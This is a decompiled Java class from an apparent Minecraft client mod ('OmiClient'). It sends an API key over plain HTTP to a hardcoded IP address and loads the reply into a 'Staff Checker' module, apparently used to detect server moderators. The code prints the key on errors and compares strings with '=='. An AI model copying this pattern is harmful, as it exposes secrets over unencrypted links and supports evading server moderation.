//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "/home/f-00/MCP-919"!

//Decompiled by Procyon!

package me.omi.thread;

import java.net.*;
import me.omi.*;
import me.omi.module.*;
import java.io.*;
import java.util.*;

public class StaffCheckRunnable implements Runnable
{
    String apiKey;
    
    public StaffCheckRunnable(final String tempKey) {
        this.apiKey = tempKey;
    }
    
    @Override
    public void run() {
        try {
            final URL url = new URL("http://178.238.8.84//index.php?id=" + this.apiKey);
            final HttpURLConnection connection = (HttpURLConnection)url.openConnection();
            connection.setRequestProperty("accept", "application/json");
            final InputStream responseStream = connection.getInputStream();
            final BufferedReader rd = new BufferedReader(new InputStreamReader(responseStream));
            final StringBuilder response = new StringBuilder();
            String line;
            while ((line = rd.readLine()) != null) {
                response.append(line);
                response.append('\r');
            }
            rd.close();
            if (response.toString().length() > 5) {
                final String test = response.toString().trim();
                final String cleaned = test.substring(0, test.length() - 1);
                for (final Module tempModule : OmiClient.instance.moduleManager.modules) {
                    if (tempModule.name == "Staff Checker") {
                        tempModule.argTest = cleaned;
                        tempModule.getDescription();
                    }
                }
            }
        }
        catch (Exception est) {
            System.out.println(est);
            System.out.println(this.apiKey);
        }
    }
}
